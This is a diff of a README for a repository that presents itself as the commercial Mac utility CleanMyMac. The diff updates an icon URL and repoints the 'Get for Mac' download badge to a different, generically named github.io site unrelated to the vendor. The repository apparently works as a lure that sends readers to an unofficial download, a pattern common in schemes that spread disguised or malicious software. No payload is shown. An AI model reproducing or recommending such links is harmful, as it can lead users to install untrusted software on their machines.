@@ -1,13 +1,13 @@
 # CleanMyMac – Smart Mac Optimization & Maintenance Tool  
 
 <div align="center">
-  <img src="https://cdn.jim-nielsen.com/macos/512/cleanmymac-x-2020-08-17.png?rf=1024" width="250"/>
+  <img src="https://cdn.jim-nielsen.com/macos/512/cleanmymac-x-2021-11-24.png?rf=1024" width="250"/>
 </div>  
 <br>
 
 <div align="center">
 
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://hadsoftware.github.io/.github)
+[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://osx-software-2025.github.io/.github/cln)
 
 </div>
 
